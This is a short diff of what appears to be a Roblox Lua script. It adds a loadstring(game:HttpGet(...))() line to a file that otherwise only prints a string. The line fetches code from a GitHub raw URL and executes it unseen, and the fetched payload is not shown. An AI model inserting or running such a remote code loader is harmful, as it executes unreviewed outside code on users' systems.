@@ -4,3 +4,4 @@ local lolmonke = "printed for pog"
 
 print(lolmonke)
 
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/loganthedevscripts/dalkdev/main/ultra%20fast%20printer'),true))()
